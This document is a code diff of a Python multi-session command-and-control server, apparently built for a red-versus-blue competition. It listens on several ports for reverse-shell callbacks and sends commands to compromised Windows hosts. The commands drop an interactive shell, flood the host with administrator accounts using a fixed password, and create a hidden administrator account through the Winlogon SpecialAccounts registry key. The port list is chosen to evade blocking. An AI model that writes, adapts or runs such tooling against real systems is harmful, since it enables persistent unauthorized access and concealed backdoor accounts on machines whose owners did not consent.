@@ -4,8 +4,6 @@ import random
 import threading
 import argparse
 
-# Shared port list — ordered by priority
-# Ports blue team can't block without killing their own scored services come first
 PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]
 
 NAME_POOLS = {
@@ -25,72 +23,86 @@ NAME_POOLS = {
     ]
 }
 
-# Shared connection object accessible across threads
-active_conn = None
-active_conn_lock = threading.Lock()
+# ── Session Registry ────────────────────────────────────────────────────────
+# Stores all active connections keyed by IP
+# { "10.100.2.10": { "conn": <socket>, "port": 80, "team": "USA" } }
+
+sessions = {}
+sessions_lock = threading.Lock()
+
+def register_session(ip, conn, port):
+    with sessions_lock:
+        if ip in sessions:
+            # Close old stale connection and replace it
+            try:
+                sessions[ip]["conn"].close()
+            except Exception:
+                pass
+        sessions[ip] = {"conn": conn, "port": port, "team": guess_team(ip)}
+        print(f"\n[+] New session: {ip} on port {port} (team: {guess_team(ip)})")
+        print("    Type 'sessions' at any prompt to see all active connections.")
+
+def guess_team(ip):
+    """Infer team from IP subnet."""
+    if ip.startswith("10.100.2."):
+        return "USA"
+    elif ip.startswith("10.100.3."):
+        return "USSR"
+    return "UNKNOWN"
+
+def remove_session(ip):
+    with sessions_lock:
+        if ip in sessions:
+            del sessions[ip]
+            print(f"[-] Session dropped: {ip}")
+
+# ── Port Listeners ───────────────────────────────────────────────────────────
+
+def accept_loop(server, port):
+    """Continuously accept new connections on a given port."""
+    while True:
+        try:
+            conn, addr = server.accept()
+            ip = addr[0]
+            register_session(ip, conn, port)
+        except Exception:
+            break
+
+def start_listeners():
+    """Spin up one listening thread per port."""
+    for port in PORTS:
+        try:
+            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server.bind(("0.0.0.0", port))
+            server.listen(10)
+            t = threading.Thread(target=accept_loop, args=(server, port), daemon=True)
+            t.start()
+            print(f"[*] Listener started on port {port}")
+        except Exception as e:
+            print(f"[!] Could not bind port {port}: {e}")
+
+# ── Command Execution ────────────────────────────────────────────────────────
 
 def send_command(conn, command):
-    conn.send((command + "\n").encode("utf-8"))
-    time.sleep(3)
-    response = b""
-    conn.settimeout(5)
     try:
-        while True:
-            chunk = conn.recv(8192)
-            if not chunk:
-                break
-            response += chunk
-    except socket.timeout:
-        pass
-    return response.decode("utf-8", errors="ignore")
-
-def listen_on_port(port, result_holder):
-    """
-    Spin up a listener on a single port.
-    First one to get a connection wins and stores it in result_holder.
-    """
-    try:
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server.bind(("0.0.0.0", port))
-        server.listen(1)
-        server.settimeout(300)  # wait up to 5 min per port
-        print(f"[*] Listening on port {port}...")
-        conn, addr = server.accept()
-
-        with active_conn_lock:
-            if result_holder["conn"] is None:
-                result_holder["conn"] = conn
-                result_holder["port"] = port
-                result_holder["addr"] = addr[0]
-                print(f"\n[+] Connection from {addr[0]} on port {port}")
-    except Exception:
-        pass
-    finally:
+        conn.send((command + "\n").encode("utf-8"))
+        time.sleep(3)
+        response = b""
+        conn.settimeout(5)
         try:
-            server.close()
-        except Exception:
+            while True:
+                chunk = conn.recv(8192)
+                if not chunk:
+                    break
+                response += chunk
+        except socket.timeout:
             pass
-# Spawns a listener thread for every port simultaneously
-def wait_for_connection():
-    result_holder = {"conn": None, "port": None, "addr": None}
-    threads = []
+        return response.decode("utf-8", errors="ignore")
+    except Exception as e:
+        return f"[!] Send failed: {e}"
 
-    for port in PORTS:
-        t = threading.Thread(
-            target=listen_on_port,
-            args=(port, result_holder),
-            daemon=True
-        )
-        t.start()
-        threads.append(t)
-
-    # Wait until one connection is established
-    print(f"[*] Listening on {len(PORTS)} ports simultaneously: {PORTS}")
-    while result_holder["conn"] is None:
-        time.sleep(0.5)
-
-    return result_holder["conn"], result_holder["port"]
+# ── User Tools ───────────────────────────────────────────────────────────────
 
 def make_user_command(username, admin=False):
     password = "Welcome1!"
@@ -104,7 +116,7 @@ def make_user_command(username, admin=False):
     return cmd
 
 def get_name_queue(team):
-    pool = NAME_POOLS[team][:]
+    pool = NAME_POOLS.get(team, NAME_POOLS["USA"])[:]
     random.shuffle(pool)
     return pool
 
@@ -115,18 +127,18 @@ def flood_users(conn, team, count, delay=0):
     print(f"\n[*] Starting user drop — {count} users, {delay}s delay each\n")
     while created < count:
         if not queue:
-            print("[*] Name queue exhausted, reshuffling...")
+            print("[*] Queue exhausted, reshuffling...")
             queue = [n for n in get_name_queue(team) if n not in used[-10:]]
         username = queue.pop(0)
         used.append(username)
         cmd = make_user_command(username, admin=True)
-        print(f"[+] Creating user ({created + 1}/{count}): {username}")
+        print(f"[+] Creating ({created + 1}/{count}): {username}")
         result = send_command(conn, cmd)
         if result.strip():
             print(result)
         created += 1
         if delay > 0 and created < count:
-            print(f"[*] Waiting {delay}s before next user...")
+            print(f"[*] Waiting {delay}s...")
             time.sleep(delay)
     print(f"\n[+] Done. {count} users created.")
 
@@ -138,8 +150,8 @@ def create_hidden_user(conn):
         f'-Password (ConvertTo-SecureString "{password}" -AsPlainText -Force) '
         f'-PasswordNeverExpires'
     )
-    cmd_admin  = f'Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
-    cmd_hide   = (
+    cmd_admin = f'Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
+    cmd_hide  = (
         f'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT'
         f'\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" '
         f'-Name "{username}" -Value 0 -PropertyType DWord -Force'
@@ -148,7 +160,9 @@ def create_hidden_user(conn):
     print(send_command(conn, cmd_create))
     print(send_command(conn, cmd_admin))
     print(send_command(conn, cmd_hide))
-    print(f"[+] Done. Hidden user '{username}' | password: {password}")
+    print(f"[+] Hidden user '{username}' created | password: {password}")
+
+# ── Menus ────────────────────────────────────────────────────────────────────
 
 def user_flood_menu(conn, team):
     while True:
@@ -163,12 +177,11 @@ def user_flood_menu(conn, team):
         elif choice == "1":
             flood_users(conn, team, count=10, delay=0)
         elif choice == "2":
-            t = threading.Thread(
+            threading.Thread(
                 target=flood_users,
                 args=(conn, team, 5, 300),
                 daemon=True
-            )
-            t.start()
+            ).start()
             print("[*] Slow drip running in background.")
         elif choice == "3":
             create_hidden_user(conn)
@@ -196,41 +209,90 @@ def automation_menu(conn, team):
             print(f"\n[*] Running: {label}")
             print(send_command(conn, cmd))
 
-def interactive_mode(conn):
-    print("[*] Interactive mode. Type 'back' to return to menu.\n")
+def interactive_mode(conn, ip):
+    print(f"[*] Interactive shell on {ip}. Type 'back' to return.\n")
     while True:
-        cmd = input("shell> ").strip()
+        cmd = input(f"{ip}> ").strip()
         if cmd.lower() == "back":
             break
         if cmd:
             print(send_command(conn, cmd))
 
-def main():
-    parser = argparse.ArgumentParser()
-    parser.add_argument(
-        "--team",
-        choices=["USA", "USSR"],
-        required=True,
-        help="Which blue team this terminal is targeting"
-    )
-    args = parser.parse_args()
-    team = args.team
+def session_menu(ip):
+    """Full interaction menu for one selected session."""
+    with sessions_lock:
+        if ip not in sessions:
+            print(f"[!] No active session for {ip}")
+            return
+        session = sessions[ip]
 
-    conn, port = wait_for_connection()
+    conn = session["conn"]
+    team = session["team"]
+    port = session["port"]
 
     while True:
-        print(f"\n=== C2 Menu [{team}] | connected on port {port} ===")
+        print(f"\n=== Session: {ip} | Team: {team} | Port: {port} ===")
         print("  [1] Interactive shell")
         print("  [2] Automations")
-        print("  [3] Exit")
+        print("  [3] Back to session list")
         choice = input("Select> ").strip()
         if choice == "1":
-            interactive_mode(conn)
+            interactive_mode(conn, ip)
         elif choice == "2":
             automation_menu(conn, team)
         elif choice == "3":
-            conn.close()
             break
+
+def print_sessions():
+    with sessions_lock:
+        if not sessions:
+            print("\n[!] No active sessions.")
+            return
+        print("\n--- Active Sessions ---")
+        for i, (ip, data) in enumerate(sessions.items(), 1):
+            print(f"  [{i}] {ip:15s}  port: {data['port']}  team: {data['team']}")
+
+def sessions_menu():
+    """Top level — pick a session or wait for one."""
+    while True:
+        print("\n======== C2 SESSIONS ========")
+        print_sessions()
+        print("\n  [i]  Interact with a session (enter IP)")
+        print("  [r]  Refresh session list")
+        print("  [q]  Quit")
+        choice = input("\nC2> ").strip().lower()
+
+        if choice == "q":
+            print("[*] Exiting.")
+            break
+        elif choice == "r":
+            continue
+        elif choice == "i":
+            ip = input("Enter target IP> ").strip()
+            with sessions_lock:
+                if ip not in sessions:
+                    print(f"[!] No session for {ip}. Check IP or wait for callback.")
+                    continue
+            session_menu(ip)
+
+# ── Entry Point ───────────────────────────────────────────────────────────────
+
+def main():
+    print("""
+ ██████╗██████╗ 
+██╔════╝╚════██╗
+██║      █████╔╝
+██║     ██╔═══╝ 
+╚██████╗███████╗
+ ╚═════╝╚══════╝  Multi-Session C2
+    """)
+
+    print("[*] Starting listeners...")
+    start_listeners()
+    print(f"[*] Listening on ports: {PORTS}")
+    print("[*] Waiting for callbacks...\n")
+
+    sessions_menu()
 
 if __name__ == "__main__":
     main()
